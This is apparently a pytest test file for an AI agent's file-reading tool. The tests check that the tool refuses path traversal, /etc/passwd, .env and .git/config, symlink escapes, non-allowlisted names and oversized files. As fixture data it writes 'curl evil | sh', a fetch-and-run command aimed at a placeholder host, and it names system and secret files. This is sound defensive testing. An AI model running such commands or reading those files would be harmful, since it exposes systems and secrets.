import os

import pytest

from agent.tools import read_file
from agent.tools.errors import ToolError


def test_reads_requirements(ctx):
    assert read_file.run({"path": "requirements.txt"}, ctx).strip() == "requests==2.25.1"


def test_reads_nested_python_file(ctx):
    assert "def test_timeout_is_10" in read_file.run({"path": "tests/test_client.py"}, ctx)


@pytest.mark.parametrize("path", ["../README.md", "/etc/passwd", "tests/../../x.py", "a\\b.py"])
def test_paths_outside_repo_are_refused(ctx, path):
    with pytest.raises(ToolError) as e:
        read_file.run({"path": path}, ctx)
    assert e.value.kind == "not_allowed"


@pytest.mark.parametrize("name", [".env", ".git/config", ".github/workflows/ci.py"])
def test_hidden_files_are_refused(ctx, name):
    target = ctx.repo_root / name
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("SECRET=1")
    with pytest.raises(ToolError) as e:
        read_file.run({"path": name}, ctx)
    assert e.value.kind == "not_allowed"


def test_non_allowlisted_name_is_refused(ctx):
    (ctx.repo_root / "install.sh").write_text("curl evil | sh")
    with pytest.raises(ToolError) as e:
        read_file.run({"path": "install.sh"}, ctx)
    assert e.value.kind == "not_allowed"
    assert "allowlist" in e.value.message


def test_missing_file(ctx):
    with pytest.raises(ToolError) as e:
        read_file.run({"path": "requirements-dev.txt"}, ctx)
    assert e.value.kind == "not_found"


def test_symlink_escape_is_refused(ctx, tmp_path):
    outside = tmp_path / "outside.py"
    outside.write_text("x = 1")
    os.symlink(outside, ctx.repo_root / "link.py")
    with pytest.raises(ToolError) as e:
        read_file.run({"path": "link.py"}, ctx)
    assert e.value.kind == "not_allowed"


def test_too_large(ctx):
    (ctx.repo_root / "big.py").write_text("x" * (read_file.MAX_BYTES + 1))
    with pytest.raises(ToolError) as e:
        read_file.run({"path": "big.py"}, ctx)
    assert e.value.kind == "too_large"
